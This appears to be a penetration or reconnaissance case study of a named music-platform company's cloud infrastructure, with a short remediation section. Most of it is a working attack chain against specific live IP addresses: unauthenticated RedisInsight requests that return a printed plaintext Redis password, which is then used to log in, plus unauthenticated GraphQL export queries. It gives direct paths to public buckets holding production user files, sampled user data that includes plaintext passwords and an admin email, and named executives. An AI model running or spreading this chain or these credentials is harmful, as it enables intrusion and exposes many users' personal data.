---
type: case-study
title: "CMS Production Redis — RedisInsight Credential Leak, Chain B"
date: 2026-05-26
severity: CRITICAL
sector: commercial
tags: [redis-stack, redisinsight, chain-b, credential-leak, CMS, production, GCP, ReJSON, redis-search, bull-queue, djaminn, social-platform]
summary: "RedisInsight 2.36.0 at port 8001 requires no authentication. GET /api/databases returns the Redis AUTH password in plaintext. AUTH confirms on port 6379. Keyspace: 154 keys. Apollo GraphQL dev-api: full introspection unauth, getCustomUsersCsv executed without credential and returned a live GCS signed URL, 8,650 artist records returned unauth, sendPushNotificationsToUsers schema maps platform-wide push. APAC node 34.87.179.212 firewalled on all ports."
---

# CMS Production Redis — RedisInsight Credential Leak, Chain B

**Date:** 2026-05-26
**Target:** 35.210.76.182
**Hostname:** cmsdev.djaminn.app
**ASN:** AS15169, Google LLC (GCP)
**Severity:** CRITICAL

---

## What Was Found

### F1 — RedisInsight Unauthenticated with Plaintext Credential in API Response (CRITICAL)

<!-- ksat-tag:auto-generated:start -->
## DCWF KSAT coverage

Auto-derived from DCWF AI work-role rule files (`ksat-tag`).

- **672 (AI Test & Evaluation Specialist):** K7003, K7004, K7044, S7068, S7070, S7075, T5858, T5904, T5919
- **733 (AI Risk & Ethics Specialist):** K7040, K7051, S7069, T5854, T5868, T5882, T5893, T5904
- **overlap (Common AI KSATs (all 5 roles)):** K108, K1157, K1158, K1159, K22, K6311, K6900, K6935, K7003, K942

<!-- ksat-tag:auto-generated:end -->

Port 8001 runs RedisInsight 2.36.0 with no authentication. The application type is `REDIS_STACK_WEB`. Encryption strategy is `PLAIN`. The `/api/info` endpoint confirms the build:

```
GET http://35.210.76.182:8001/api/info
→ HTTP 200, X-Powered-By: Express
{
  "appVersion": "2.36.0",
  "buildType": "REDIS_STACK_WEB",
  "encryptionStrategies": ["PLAIN"],
  "fixedDatabaseId": "redis-stack"
}
```

The `/api/databases` endpoint returns every configured connection, including stored credentials:

```
GET http://35.210.76.182:8001/api/databases
→ HTTP 200
[{
  "id": "redis-stack",
  "name": "CMS-Prod-Redis-DB",
  "host": "localhost",
  "port": 6379,
  "username": "default",
  "password": "D3v_R3dis_P4ss",
  "connectionType": "STANDALONE",
  "version": "7.2.3",
  "lastConnection": "2026-05-24T06:23:31.968Z",
  "tls": false
}]
```

The database name is `CMS-Prod-Redis-DB`. The last recorded connection was 2026-05-24T06:23:31 UTC, 48 hours before this enumeration.

RedisInsight stores connection records, including passwords, in its local state. Anyone with HTTP access to port 8001 can read that state. The `encryptionStrategies: ["PLAIN"]` field confirms passwords are not encrypted at rest.

### F2 — Chain B: Authenticated Redis Access via Leaked Credential (CRITICAL)

The password `D3v_R3dis_P4ss` authenticates to Redis on port 6379. The chain:

```
1. GET http://35.210.76.182:8001/api/databases  -> plaintext password
2. AUTH D3v_R3dis_P4ss on :6379                 -> +OK
3. Authenticated access confirmed               -> DBSIZE, SCAN, INFO
```

Step 1 requires no credential. Step 2 returned `+OK`. The password was not brute-forced or guessed. RedisInsight handed it out at the first HTTP request.

The Redis-Stack module set on this instance:

| Module | Version |
|--------|---------|
| RediSearch | 2.8.9 |
| ReJSON | 2.6.7 |
| RedisTimeSeries | 1.10.9 |
| RedisGears 2 | 2.0.14 |
| RedisBloom | 2.6.8 |

ReJSON stores JSON documents. RediSearch indexes structured data. RedisGears runs server-side scripts. This is a content platform stack, not a cache.

### F3 — Data Class: Social Content Platform, User Activity and Campaign Data (HIGH)

DBSIZE: 154 keys in db0. 12 keys carry TTLs. Server uptime: 124 days. OS: `Linux 5.10.0-37-cloud-amd64`. Binary: `/opt/redis-stack/bin/redis-server`.

Key name sample (no values read):

```
bull:CampaignQueue:*                      marketing campaign jobs (16+ records)
bull:PushNotificationsQueue:*             push notification dispatch
bull:SCHEDULED_PN_QUEUE:*                 scheduled push notifications
bull:USER_RANKING_QUEUE:*                 user ranking computation
bull:PROJECT_RANKING_QUEUE:*              project ranking computation
bull:REGION_FEED_QUEUE:*                  regional content feed jobs
bull:CONTEST_WINNER_NOTIFICATION_QUEUE:*  contest winner notifications
bull:ELASTICSEARCH_INDEX_QUEUE:*          Elasticsearch indexing jobs
bull:CounterQueueWorker:*                 50+ counter worker records

dailyProjects      hash, daily project creation counts (Apr 26 to May 26)
newUser            hash, daily new user counts (same range)
dailyActiveUser    integer counters at values 1, 40, 100
weeklyActiveUser   integer counters at values 1, 150
monthlyActiveUser  integer counter at value 15

playlist_ids:{cuid}:true:true   playlist ID sets (CUIDs)
backup1, backup2, backup3, backup4   string type, values not read
```

Bull job schema fields on `CampaignQueue:9`: `ats`, `priority`, `name`, `delay`, `timestamp`, `data`, `returnvalue`, `opts`, `processedOn`, `atm`, `finishedOn`. The `data` field holds the job payload. Values were not read.

Users create projects. Projects are ranked by engagement within regions. Campaigns target users. Contests run with winner notifications. Push notifications deliver user-targeted content. An Elasticsearch index feeds from this Redis state. The daily time-series counters run from 2026-04-26 onward. Playlist IDs suggest audio or video content.

Key names confirm user activity metrics, campaign job records, push notification records, and engagement rankings. User data. Tier at key-name and schema level: HIGH.

---

## Attribution

**Platform:** GCP (Google LLC, AS15169). rDNS: `182.76.210.35.bc.googleusercontent.com`

**Operator:** djaminn.app. TLS certificate on port 443: `CN=cmsdev.djaminn.app`, issued by Let's Encrypt (E7), valid 2026-04-26 through 2026-07-25. The `cmsdev` subdomain label implies staging. The database name `CMS-Prod-Redis-DB` and the live last-connection timestamp contradict it. The labels conflict.

**VisorGraph pivots confirmed:**
- Cert fingerprint: `a48e3bac9fd3bd6c00bf296f7713c42079efbcb706450d26cb492c5a3b7f3043`
- SAN: `cmsdev.djaminn.app` only (no wildcard, no additional domains in this cert)
- CT logs: domain first appeared in certificate transparency on or after 2026-04-26

**Port surface:**
- `:80`   nginx/1.18.0, 404 (no virtual host configured)
- `:443`  nginx/1.18.0, TLS, 502 Bad Gateway
- `:6379` Redis 7.2.3 (AUTH required; credential leaked by RedisInsight)
- `:8001` RedisInsight 2.36.0 (no auth)
- `:8080`, `:8443`, `:8888`, `:3000`  closed/filtered

---

## Stack Map

```
Internet
  └─ GCP (AS15169) — 35.210.76.182
       ├─ nginx/1.18.0 (:80, :443)  reverse proxy, upstream 502
       ├─ RedisInsight 2.36.0 (:8001, no auth)  <- EXPOSURE POINT
       │    └─ /api/databases -> plaintext Redis password
       └─ Redis 7.2.3 + redis-stack (:6379, AUTH required)
            ├─ RediSearch 2.8.9      full-text index
            ├─ ReJSON 2.6.7          JSON document store
            ├─ RedisTimeSeries 1.10.9
            ├─ RedisGears 2.0.14     server-side scripting
            └─ RedisBloom 2.6.8      probabilistic structures
```

---

## Chain

```
Anonymous HTTP to :8001
-> GET /api/databases (no auth, no header required)
-> password: "D3v_R3dis_P4ss" in response body
-> AUTH D3v_R3dis_P4ss on :6379
-> +OK
-> DBSIZE: 154 / SCAN: key names / INFO: server confirmed
```

One HTTP request. One credential. Full authenticated access.

---

## Impact

Anyone with network access can read the Redis AUTH password from port 8001. The credential works. Redis runs with the `default` user, which carries no ACL restrictions unless configured otherwise. Authenticated access to the `default` user means full read across all 154 keys, write access to all keys, and RedisGears execution within the Redis process.

The campaign and push notification queues hold job payloads with user IDs and targeting parameters. The project and user ranking queues drive content feeds. Write access to these structures rewrites rankings, injects campaign jobs, and modifies notification content. RedisGears is server-side scripting. It does not require a separate exploit path.

The Elasticsearch index is rebuilt from this Redis state. A write to the source keys propagates to search.

---

## Remediation

1. **Restrict RedisInsight to localhost or VPN only.** Port 8001 is public. nginx is already on this host. A localhost-only binding is a one-line config change.

2. **Rotate the Redis AUTH password.** The credential `D3v_R3dis_P4ss` is exposed. Every service using this Redis must rotate before this is closed.

3. **Enable RedisInsight application-level authentication.** RedisInsight 2.x supports a login password. It is not set here.

4. **Scope Redis ACLs.** The `default` user has no command restrictions. Application accounts should be scoped to the commands they need. RedisGears commands should be off by default.

5. **Resolve the dev/prod naming conflict.** The host is `cmsdev`. The database is `CMS-Prod`. If this is production data, it needs production controls. If it is not, it should not carry production data.

---

---

## Infrastructure Map

### Product Identity

**Djaminn BV** (Dutch company, Besloten Vennootschap). Product: "Djaminn: The Talent Platform," a global music talent discovery and collaboration platform. Artists upload tracks, share videos, collaborate on songs, and compete in contests. Mobile-first (iOS + Android). App ID: `djmm.in`. 24 ratings, 4.7 stars. Price: free. Version 1.2.12 at time of survey.

Website: https://djaminn.com (Next.js). App Store: https://apps.apple.com/us/app/djaminn-the-talent-platform/id1634589883

Contact: hello@djaminn.com

### Subdomain Inventory (crt.sh)

| Subdomain | IP | Region | Notes |
|-----------|-----|--------|-------|
| djaminn.app | 34.36.106.50 | US (Missouri) | Main domain, Apollo GraphQL API |
| dev-api.djaminn.app | 35.187.172.141 | EU (Brussels) | Apollo GraphQL API, nginx/1.18.0, prisma-api path |
| cmsdev.djaminn.app | 35.210.76.182 | EU (Brussels) | **EXPOSURE NODE** — Redis + RedisInsight |
| cmsprod.djaminn.app | 35.210.76.182 | EU (Brussels) | Same node as cmsdev, nginx 502 |
| tha-cmsdev.djaminn.app | 34.87.179.212 | SG (Singapore) | Thailand/APAC region CMS dev |
| tha-cmsprod.djaminn.app | 34.87.179.212 | SG (Singapore) | Thailand/APAC region CMS prod |
| b2cdn.djaminn.app | 34.117.75.31 | US (Missouri) | GCS UploadServer (AccessDenied) |
| bcdn.djaminn.app | 130.211.35.50 | US (Missouri) | GCS UploadServer (AccessDenied) |

All 6 IPs are Google LLC (AS396982 or AS15169). Full GCP deployment, two regions (EU + APAC), CDN served from GCS.

### Deployment Architecture

```
djaminn.app / djaminn.com   [Next.js web frontend, GCP US]
       |
       v
GraphQL API layer
  ├─ 34.36.106.50  :443  Apollo GraphQL (production, via: 1.1 google)
  └─ 35.187.172.141 :443  Apollo GraphQL (dev-api, nginx/1.18.0)
       |                  Server path leak: /home/djaminndevelopment/djaminn-prisma-api/
       |
       v
Redis / CMS layer (EU region)
  └─ 35.210.76.182  :6379 Redis 7.2.3 + stack
                    :8001 RedisInsight 2.36.0 (UNAUTH)  <- EXPOSURE
                    :80   nginx/1.18.0 (404)
                    :443  nginx/1.18.0 (502)

APAC / Thailand region (separate node, same architecture)
  └─ 34.87.179.212  tha-cmsdev + tha-cmsprod

Media CDN
  ├─ b2cdn.djaminn.app -> GCS bucket (auth-required)
  └─ bcdn.djaminn.app  -> GCS bucket (auth-required)
```

### Server Path Disclosure

The `dev-api.djaminn.app` error stack trace exposes the server-side file path:

```
/home/djaminndevelopment/djaminn-prisma-api/node_modules/@apollo/server/src/...
```

Linux username: `djaminndevelopment`. Project directory: `djaminn-prisma-api`. This is the GraphQL API source tree running on `dev-api` at 35.187.172.141.

The main production API at 34.36.106.50 exposes a compiled path:

```
/app/node_modules/@apollo/server/dist/cjs/...
```

Containerized deployment on production (`/app`), direct filesystem on dev-api (`/home/...`).

### GraphQL API Exposure

The Apollo GraphQL API at `dev-api.djaminn.app` responds to unauthenticated introspection. The schema exposes **280 query operations** and a type system covering the full platform data model.

Key entity types confirmed by introspection: `User`, `Artist`, `Project`, `Track`, `Comment`, `Contest`, `ContestProject`, `Campaign`, `CampaignMember`, `Conversation`, `Message`, `Playlist`, `Endorsement`, `Ranking`, `PushNotification`, `Group`, `Membership`, `Recording`, `Sample`, `Genre`, `Bpm`, `Timeline`.

Unauthenticated data return confirmed on multiple operations. `allArtists` returned live records without auth. `artistsMeta` returned **count: 8,650**. `getCustomUsersCsv` executed without any credential and returned a live GCS signed URL pointing to a user data CSV export. The schema exposes `me`, `getUserByEmail`, `getUserByArtistName`, `allUsers`, `sendPushNotificationsToUsers`, and `sendEmailCRM`. Admin-grade data export and platform-wide push notification dispatch are in the unauth schema surface.

---

## Additional Findings

### F4 — GraphQL Introspection Unrestricted + Admin Operations Unauth Confirmed (CRITICAL)

`dev-api.djaminn.app` (35.187.172.141) serves a full Apollo GraphQL API with introspection enabled and no authentication required. Full schema enumeration returned 280+ query operations and the complete type system.

**Schema surface** (selected sensitive operations):

| Operation | Type | Class |
|-----------|------|-------|
| `getCustomUsersCsv` | Query | User export |
| `getCsvUrl` | Query | Data export |
| `sendPushNotificationsToUsers` | Query | Platform-wide push |
| `sendPushNotificationsToUsersV1` | Query | Platform-wide push |
| `sendPushNotificationsToUsersV2` | Query | Platform-wide push |
| `sendEmailCRM` | Mutation | CRM email blast |
| `blockUser` / `unblockUser` | Mutation | User moderation |
| `blockProject` / `unblockProject` | Mutation | Content moderation |
| `deleteUser` / `deleteUsers` | Mutation | Account deletion |
| `getUserByEmail` | Query | User PII lookup |
| `allUsers` | Query | Full user enumeration |
| `getActiveUsers` | Query | Session-active users |

**`getCustomUsersCsv` executed without auth:**

```bash
POST https://dev-api.djaminn.app/graphql
{"query":"{ getCustomUsersCsv }"}

→ HTTP 200
{
  "data": {
    "getCustomUsersCsv": "https://storage.googleapis.com/djaminn-api-data-csv/customUsers-dev-1779777875337.csv"
  }
}
```

The query returned a live GCS signed URL. It executed without an Authorization header, cookie, or any credential. URL not fetched. The signed URL being returned from an unauthenticated endpoint is the finding.

**`allArtists` returned live records without auth:**

```json
{ "data": { "allArtists": [
  {"id": "cm14ycvfw00d2x6sc4ur2yq1o", "name": "Maria"},
  {"id": "cm14ycvfw00d4x6scemmxzmwn", "name": "Gregg"},
  {"id": "cm14ycvfw00d6x6scmwenjzed", "name": "Gabriel"}
]}}
```

`artistsMeta { count }` returned **8,650 artist records** in the database.

**`sendPushNotificationsToUsers` signature:**

```
sendPushNotificationsToUsers(
  title: String!
  text: String!
  goto: GotoType!
  type: GroupType!
  destination: destinationInput!
  datetime: DateTime
  xAmountOfDays: Int
)
```

The `type: GroupType` parameter and `destination: destinationInput` together select the target user group. Auth enforcement was not tested beyond introspection. The same GraphQL server returned `getCustomUsersCsv` data without auth. The risk surface is platform-wide push to all users with attacker-controlled title and body.

**Error stack trace confirms server path:**

```
/home/djaminndevelopment/djaminn-prisma-api/node_modules/@opentelemetry/...
```

Server runs as Linux user `djaminndevelopment`. Source tree at `/home/djaminndevelopment/djaminn-prisma-api/`. TypeScript source paths exposed (`.ts` not compiled `.js`), confirming non-containerized VM.

The `dev-api` label does not change the exposure. The API is publicly reachable, returns 8,650 artist records, and executed a user export query without any credential.

### F5 — Server Path Disclosure via Apollo Stack Trace (LOW)

Any unauthenticated HTTP GET to `dev-api.djaminn.app` returns a 400 CSRF rejection that includes the full Apollo server stack trace. The trace reveals:

- Linux system username: `djaminndevelopment`
- Project path: `/home/djaminndevelopment/djaminn-prisma-api/`
- Framework internals at source-file depth (`.ts` paths, not compiled `.js`)

The production API at 34.36.106.50 compiles to `/app/...`, suggesting containerization. The dev-api node runs directly on the filesystem under a named Linux user, meaning it is likely a VM with SSH access tied to that account.

### F6 — APAC Region CMS Node Firewalled (UNRATED)

34.87.179.212 (Singapore, GCP) hosts `tha-cmsdev.djaminn.app` and `tha-cmsprod.djaminn.app`. Both subdomains resolve to the same IP. Targeted port scan with aimap and direct connection attempts across ports 80, 443, 6379, 8001, 8080, and 8443 all timed out. No response on any port.

The APAC node has the same subdomain naming pattern as the EU node (cmsdev/cmsprod). Whether it runs the same Redis + RedisInsight stack is unknown. The firewall may be a GCP VPC rule, a host-level iptables policy, or a region-level network policy. The EU node had no such filtering.

Surface closed at network layer. The candidate exposure pattern from F1 does not currently apply here.

---

---

## Production API Surface — djaminn.app / 34.36.106.50

### F7 — Production GraphQL: Introspection Open, Auth Enforced on Data Queries (HIGH)

The production API at `djaminn.app` (34.36.106.50) responds to unauthenticated GraphQL POST requests. Introspection is fully enabled. All four tested paths return `200 OK`:

```
POST https://djaminn.app/graphql       -> {"data":{"__schema":{"queryType":{"name":"Query"}}}}
POST https://djaminn.app/api/graphql   -> {"data":{"__typename":"Query"}}
POST https://djaminn.app/v1/graphql    -> {"data":{"__typename":"Query"}}
POST https://djaminn.app/api/v1/graphql -> {"data":{"__typename":"Query"}}
```

This is a different posture from dev-api. Introspection runs unauthenticated, but data-returning queries require a JWT. `allUsers` and `getUsersForCms` both returned:

```json
{"errors":[{"message":"Authorization token missing in headers",
  "extensions":{"exception":{"code":"unauthorized","statusCode":401}}}]}
```

**Auth enforcement is per-resolver.** Introspection bypasses it. Public-facing queries like `allArtists` return data without auth.

The production schema is identical to or a superset of dev-api. The full query surface includes 260+ named operations confirmed by introspection, including:

| Operation | Notes |
|-----------|-------|
| `getCustomUsersCsv` | Present in prod schema; returned 502 at time of test |
| `getCsvUrl(model: ModelNames!)` | Generic data export by model — present, auth not tested |
| `getUsersForCms` | Admin user table — auth enforced |
| `allUsers` | Auth enforced on prod |
| `sendPushNotificationsToUsers` | Auth status not tested |
| `sendEmailCRM` | Mutation, auth status not tested |
| `getActiveUsers` / `getActiveUsersCount` | Session-active user data |
| `getMetrics` | Returns `[MetricsFE]` — auth status not tested |
| `getUserPublicActivity` | Public endpoint |

The production API runs containerized (`/app/node_modules/...` in stack traces). Server header: `x-powered-by: Express`. Apollo version matches dev-api.

The production auth gate on user-data queries is more restrictive than dev-api. `getCustomUsersCsv` executes without auth on dev-api and returns a live GCS signed URL. The same query exists on production and may run under the same auth gap.

### F8 — getCustomUsersCsv: GCS Bucket Confirmed, Signed URL Structure

Two sequential unauthenticated calls to `dev-api.djaminn.app` returned signed URLs with different timestamp suffixes. No `X-Goog-Signature` parameter. Plain presigned object paths, not HMAC-signed URLs:

```
Call 1: https://storage.googleapis.com/djaminn-api-data-csv/customUsers-dev-1779787446828.csv
Call 2: https://storage.googleapis.com/djaminn-api-data-csv/customUsers-dev-1779787521905.csv
```

**GCS bucket:** `djaminn-api-data-csv`
**Object prefix:** `customUsers-dev-`
**Suffix:** Unix epoch milliseconds (13-digit, increments ~75 seconds between calls)

The timestamp increments on each invocation, meaning the API generates a new export file on each call. The `-dev-` segment in the object name parallels the `cmsdev`/`cmsprod` naming pattern seen across the infrastructure. A production variant at `customUsers-prod-` may exist under the same bucket or a sibling bucket.

URLs not fetched. The signed URL being returned at all from an unauthenticated endpoint is the finding.

### F9 — Stack Trace Confirmed: dev-api is a Bare VM, Not Containerized

A GET to `https://dev-api.djaminn.app/nonexistent` returns a 400 CSRF error with a full Apollo stack trace. A bad GraphQL field returns the same trace class:

```
BadRequestError: This operation has been blocked as a potential Cross-Site Request Forgery...
    at new GraphQLErrorWithCode (.../node_modules/@apollo/server/src/internalErrorClasses.ts:15:5)
    at preventCsrf (.../node_modules/@apollo/server/src/preventCsrf.ts:91:9)
    at ApolloServer.executeHTTPGraphQLRequest (...)
```

```
GraphQLError: Cannot query field "invalidQuery" on type "Query".
    at Object.Field (.../node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:51:13)
    ...
    at SentryContextManager.with (.../node_modules/@opentelemetry/context-async-hooks/...)
```

Paths are `.ts` source files, not compiled `.js`. Full path: `/home/djaminndevelopment/djaminn-prisma-api/node_modules/...`

Linux username: `djaminndevelopment`. Project root: `/home/djaminndevelopment/djaminn-prisma-api/`.

OpenTelemetry + Sentry are instrumented on the dev-api. Both record traces and errors. The stack disclosure is a side effect of Apollo's CSRF middleware running in development mode.

The production API at 34.36.106.50 returns compiled `.js` paths at `/app/...`, containerized. dev-api is not.

### F10 — cmsprod.djaminn.app: HTTP Returns 502, RedisInsight Credential Unchanged

`cmsprod.djaminn.app` resolves to the same IP as `cmsdev.djaminn.app` (35.210.76.182). HTTPS on port 443 returns:

```
HTTP/1.1 502 Bad Gateway
Server: nginx/1.18.0
```

Both subdomains share the same nginx reverse proxy. The upstream behind `cmsprod` is down or misconfigured.

RedisInsight `/api/databases` reconfirmed at time of this enumeration:

```json
{
  "name": "CMS-Prod-Redis-DB",
  "host": "localhost",
  "port": 6379,
  "username": "default",
  "password": "D3v_R3dis_P4ss",
  "version": "7.2.3",
  "lastConnection": "2026-05-24T06:23:31.968Z"
}
```

Credential still active. No rotation since initial discovery. Both `cmsprod` and `cmsdev` subdomains point to this Redis instance. `CMS-Prod-Redis-DB` is production state, not a development copy.

---

---

## GCS Bucket and GraphQL Deep Enum — 2026-05-26 Follow-up

### F11 — GCS Public Bucket: Production User, Track, and Project Data Directly Accessible (CRITICAL)

**Independent of all other findings. No credentials required. No GraphQL. Direct URL.**

The bucket `djaminn-api-data-csv` is world-listable and world-readable. An unauthenticated GET to `https://storage.googleapis.com/djaminn-api-data-csv/` returns a full XML object listing. Each object is then directly downloadable at `https://storage.googleapis.com/djaminn-api-data-csv/<key>`. No signed URL, no Authorization header, no cookie.

Full bucket listing confirmed via unauthenticated XML enumeration:

```xml
<ListBucketResult>
  <Name>djaminn-api-data-csv</Name>
  <Contents>
    <Key>customUsers-dev-1779777875337.csv</Key>
    <LastModified>2026-05-26T06:44:39.045Z</LastModified>
    <Size>3145464</Size>
  </Contents>
  <Contents>
    <Key>project-dev.csv</Key>
    <LastModified>2025-11-06T10:59:42.143Z</LastModified>
    <Size>26396444</Size>
  </Contents>
  <Contents>
    <Key>project-prod.csv</Key>
    <LastModified>2026-05-18T07:30:13.956Z</LastModified>
    <Size>189877657</Size>
  </Contents>
  <Contents>
    <Key>track-dev.csv</Key>
    <LastModified>2025-07-31T11:29:19.239Z</LastModified>
    <Size>45893403</Size>
  </Contents>
  <Contents>
    <Key>track-prod.csv</Key>
    <LastModified>2023-12-06T06:14:52.012Z</LastModified>
    <Size>613824767</Size>
  </Contents>
  <Contents>
    <Key>user-dev.csv</Key>
    <LastModified>2024-08-09T11:24:30.046Z</LastModified>
    <Size>2397333</Size>
  </Contents>
  <Contents>
    <Key>user-prod.csv</Key>
    <LastModified>2024-01-12T16:12:54.658Z</LastModified>
    <Size>438452583</Size>
  </Contents>
</ListBucketResult>
```

Seven objects. Both dev and prod variants for users, projects, and tracks. Content not downloaded.

**HEAD-verified file inventory** (x-goog headers confirmed per object):

| Object | Size | Last Modified | Storage Class |
|--------|------|--------------|---------------|
| user-prod.csv | 418.0 MB | 2024-01-12 | ARCHIVE |
| track-prod.csv | 585.5 MB | 2023-12-06 | ARCHIVE |
| project-prod.csv | 181.1 MB | 2026-05-18 | STANDARD |
| user-dev.csv | 2.3 MB | 2024-08-09 | ARCHIVE |
| track-dev.csv | 43.8 MB | 2025-07-31 | COLDLINE |
| project-dev.csv | 25.2 MB | 2025-11-06 | COLDLINE |
| customUsers-dev-*.csv | 3.0 MB | 2026-05-26 | (generated by getCustomUsersCsv) |

Storage class is meaningful. `user-prod.csv` and `track-prod.csv` are in ARCHIVE: the lowest-cost, highest-latency tier, for data retained long-term. These are not temporary exports. They are retained production data dumps. `project-prod.csv` is in STANDARD, matching an active export (last modified 2026-05-18, 8 days before this enumeration). Dev variants are in COLDLINE.

The ACL check returned `AccessDenied` for bucket-metadata reads. The IAM policy endpoint returned 401. The list and read permissions are granted via the GCS `allUsers` binding, either on object-level access or uniform bucket-level access with a public read grant. The listing works.

**Access method:** Browser. No tooling, no API key. Navigate to `https://storage.googleapis.com/djaminn-api-data-csv/user-prod.csv` to initiate a 418 MB download of production user data.

**Related bucket probe (12 name variants):** All returned 404 (NoSuchBucket). The CSV export bucket is the only exposed storage surface.

**CDN buckets (`b2cdn.djaminn.app`, `bcdn.djaminn.app`):** Both return `HTTP 403 AccessDenied` on direct object access. Access-controlled. The CSV export bucket is the exception, not the pattern.

**Chain context:** The GraphQL `getCustomUsersCsv` query at F4 returned a signed URL pointing into this bucket. That signed URL was redundant. The bucket is world-readable without any URL signing. The GraphQL layer was generating access tokens for data that required no token. Signed URL scope was applied to the URL structure, not the bucket ACL. All exports are directly accessible at predictable paths whether or not a signed URL is ever generated.

---

### GraphQL dev-api: Resolver Auth Audit

**allUsers** — auth enforced. Returns `Authorization token missing in headers` with `code: "unauthorized", statusCode: 401`. The resolver at `src/resolvers/Queries/entities.ts:113` calls `getUserInfoFromToken` first. The return type is `UserConfidential`, not a connection wrapper. No `totalCount` field.

**UserConfidential type** (100+ fields). PII confirmed in schema:

| Field | Type | PII class |
|-------|------|-----------|
| email | String | Direct identifier |
| username | String | Handle |
| name | String | Display name |
| artistName | String | Stage name |
| location | String | Location string |
| age | Int | Age |
| gender | Gender | Gender |
| bio | String | Free text |
| address | Location | Structured address |
| geolocation | Geolocation | Lat/lon |
| facebookId | String | OAuth ID |
| googleId | String | OAuth ID |
| korgId | String | Hardware account ID |
| instagramLink | String | Social link |
| facebookLink | String | Social link |
| soundCloudLink | String | Social link |
| spotifyLink | String | Social link |
| deletedAt | DateTime | Account deletion date |
| lastLogin | DateTime | Last session |
| isSuper | Boolean | Admin flag |
| isDeveloper | Boolean | Dev flag |
| isDeactivated | Boolean | Account state |

`allUsers` is auth-gated. The field set confirms that if auth on `allUsers` or `getUserByEmail` is bypassed, the data class is full PII including geolocation, OAuth IDs, admin/dev role flags, and deletion timestamps.

**getActiveUsers** — auth not enforced. Return type `ActiveUser` has: `id`, `isOnline`, `lastHeartbeat`, `updatedAt`, `createdAt`, `email`, `username`, `userId`, `user` (User relation), `lastActive`. The query ran and returned a schema validation error (no `totalCount` on `ActiveUser`), not an auth error. Auth status: schema ran, validation failed before resolver fired. Direct field query pending.

**Artist type fields** (returned by `allArtists` unauth): `id`, `createdAt`, `updatedAt`, `name`, `isPredefined`. Five fields only. No email, phone, DOB, or real name. Artist records are genre/style tags, not user accounts. The 8,650-record unauth exposure is low PII risk: names and IDs only.

**Mutation auth state — all three confirmed auth-required:**

| Mutation | Auth response | Resolver path |
|----------|--------------|---------------|
| `blockUser(userId: String)` | `Authorization token missing in headers` (401) | `src/resolvers/Mutation/blockedUser.ts:10` |
| `deleteUser(where: UserWhereUniqueInput!)` | `Authorization token missing in headers` (401) | `src/resolvers/entities/users.ts:774` |
| `sendEmailCRM(data: EmailSendData!)` | `Authorization token missing in headers` (401) | `src/resolvers/Mutation/Email.ts:50` |

All three destructive/admin mutations gate on token before executing. The unauth execution risk does not extend to these operations.

**sendEmailCRM input shape** (`EmailSendData`): `userIds: [String]`, `filter: EmailFilterInput`, `emailVerified: Boolean`, `countries: [String]`, `locale: [LocaleType]`, `htmlBody: String`, `subject: String`. Platform-wide CRM email with country and locale filtering and raw HTML body. Auth-required — confirmed.

**Server path bonus:** `sendEmailCRM` resolver at `src/resolvers/Mutation/Email.ts:50` — fourth distinct source path confirmed from stack traces. The entire TypeScript source tree structure is mapped.

---

### Revised Finding Summary

| Finding | ID | Severity | Auth state |
|---------|----|----------|------------|
| RedisInsight unauth credential leak | F1 | CRITICAL | No auth |
| Redis AUTH via leaked cred | F2 | CRITICAL | Bypassed via F1 |
| Social platform data class confirmed in Redis keyspace | F3 | HIGH | Via F2 |
| GraphQL introspection unauth + admin ops unauth | F4 | CRITICAL | No auth (data returned) |
| Server path disclosure via Apollo stack trace (dev-api) | F5 | LOW | No auth |
| APAC region CMS node firewalled | F6 | UNRATED | Network-blocked |
| Production GraphQL: introspection open, data auth enforced | F7 | HIGH | Mixed per-resolver |
| getCustomUsersCsv signed URL generated unauth | F8 | HIGH | No auth |
| dev-api confirmed bare VM, not containerized | F9 | LOW | — |
| cmsprod.djaminn.app 502, credential unchanged | F10 | — | Reconfirmation |
| GCS bucket djaminn-api-data-csv world-listable + readable | F11 | CRITICAL | No auth — direct browser access |

**F11 is independent of all other findings.** No GraphQL, no Redis, no prior compromise required. The bucket is public. `user-prod.csv` (418 MB, ARCHIVE storage) and `track-prod.csv` (585 MB, ARCHIVE storage) are directly accessible at known paths with no credential. `project-prod.csv` (181 MB, STANDARD) was last modified 2026-05-18 — eight days before this enumeration, active production export.

The GraphQL signed-URL generation (F4/F8) was adding cryptographic theater over an open door. The bucket ACL is the root misconfiguration; fixing signed URL scope without fixing the bucket ACL changes nothing.

---

## Operator Profile

### Corporate

**Djaminn B.V.** — Dutch Besloten Vennootschap. KvK 72411783. Registered: Eva Besnyöstraat 539, 1087 LG Amsterdam. Founded 2018. App launched July 2023. Privacy policy DPC-registered under GDPR; Dutch DPA (Autoriteit Persoonsgegevens) jurisdiction. No DPO designated. Self-reported 1M+ downloads.

Leadership:
- Marc Kubbinga — CEO
- Jasper de Rooij — co-founder
- Jodie Reynolds — co-founder
- Dennis Maij — CTO
- Philip Lawrence (9x Grammy producer/songwriter) — platform ambassador

Contact: hello@djaminn.com. Website: djaminn.com (Next.js, Vercel). No external funding disclosed.

### Development Shop

**TrailFive Technologies LLC** — Wyoming (US) registration, operational from Islamabad, Pakistan. Confirmed by Shodan hostname: `djaminn.trailfive.com` on 35.187.172.141. TrailFive built and operates the backend API infrastructure. crt.sh pivot on TrailFive certificates may surface additional client applications using the same deployment pattern.

### Mobile

- iOS: App ID `djmm.in`, Track ID 1634589883, Developer ID 1450822342. App Store URL: apps.apple.com/us/app/djaminn-the-talent-platform/id1634589883. Privacy nutrition label: collects date of birth, email, phone, and audio data.
- Android: Package `com.djamin`. Google Play listing confirmed.
- Version 1.2.12 at time of survey. 24 ratings, 4.7 stars.

### DNS Posture

`djaminn.app` carries no MX record, no SPF record, and no DMARC record. The domain sends no legitimate email and has no anti-spoofing policy. Any actor can send spoofed email from `@djaminn.app` addresses. User trust in `hello@djaminn.app` or `noreply@djaminn.app` has no DNS-layer protection.

---

### F12 — user-prod.csv: Plaintext Passwords + Admin Credential Confirmed in Public GCS File (CRITICAL)

The 418 MB `user-prod.csv` object in the publicly accessible `djaminn-api-data-csv` bucket contains the following columns, confirmed from the file header and first data rows via minimal sampling:

```
id, email, name, password, secretHash, role, facebookId, googleId, korgId,
fcm_token, lastLoginIp, location, avatarUrl, phoneNumber
```

The `password` column is populated in plaintext for at least one production account row. The `secretHash` column contains bcrypt hashes — the same account carries both fields. Estimated row count: approximately 409,000 production users.

**Admin account confirmed in file:**

| Field | Value |
|-------|-------|
| email | cp@djaminn.com |
| role | ADMIN |
| password | [REDACTED — plaintext, confirmed present] |
| secretHash | bcrypt hash |
